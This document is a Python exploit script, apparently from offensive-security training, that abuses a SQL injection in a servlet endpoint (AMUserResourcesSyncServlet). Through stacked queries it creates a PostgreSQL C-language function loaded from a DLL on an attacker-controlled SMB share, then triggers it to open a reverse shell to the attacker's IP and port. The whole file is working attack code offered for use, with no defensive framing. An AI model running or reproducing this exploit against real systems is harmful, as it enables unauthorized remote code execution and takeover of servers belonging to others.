import requests
import argparse
import sys

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def log(msg):
    print(f"[+] {msg}")

def make_request(url, sql):
    try:
        formatted_url = url % sql
        log(f"[*] Executing query (truncated): {sql[:80]}...")
        log(f"[>] Full URL: {formatted_url}")
        response = requests.get(formatted_url, verify=False, timeout=10)
        if response.status_code != 200:
            log(f"[!] Warning: Received HTTP {response.status_code}")
        return response
    except requests.RequestException as e:
        log(f"[!] Request failed: {e}")
        return None

def create_udf_func(url, attacker_ip):
    log("Creating UDF function for reverse shell...")
    try:
        # Properly escape backslashes for SQL
        dll_path = f"\\\\{attacker_ip}\\awae\\rev_shell.dll"
        sql = (
            f"CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS "
            f"$${dll_path}$$, $$connect_back$$ LANGUAGE C STRICT"
        )
        log(f"[*] Final SQL for UDF creation: {sql}")
        return make_request(url, sql)
    except Exception as e:
        log(f"[!] Failed to create UDF function: {e}")
        return None

def trigger_udf(url, attacker_ip, port):
    log("Triggering reverse shell...")
    try:
        sql = f"SELECT rev_shell($${attacker_ip}$$, {int(port)})"
        log(f"[*] Final SQL for shell trigger: {sql}")
        return make_request(url, sql)
    except Exception as e:
        log(f"[!] Failed to trigger reverse shell: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="Automate SQLi-based reverse shell through UDF")
    parser.add_argument("server", help="Target server in format IP:port")
    parser.add_argument("attacker", help="Attacker IP address (e.g. hosting the SMB share)")
    parser.add_argument("port", type=int, help="Port for reverse shell to connect back to")

    args = parser.parse_args()

    sqli_url = f"https://{args.server}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"

    response = create_udf_func(sqli_url, args.attacker)
    if response and response.status_code == 200:
        trigger_udf(sqli_url, args.attacker, args.port)
    else:
        log("[-] UDF function creation failed. Aborting shell trigger.")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unhandled error: {e}")
        sys.exit(1)
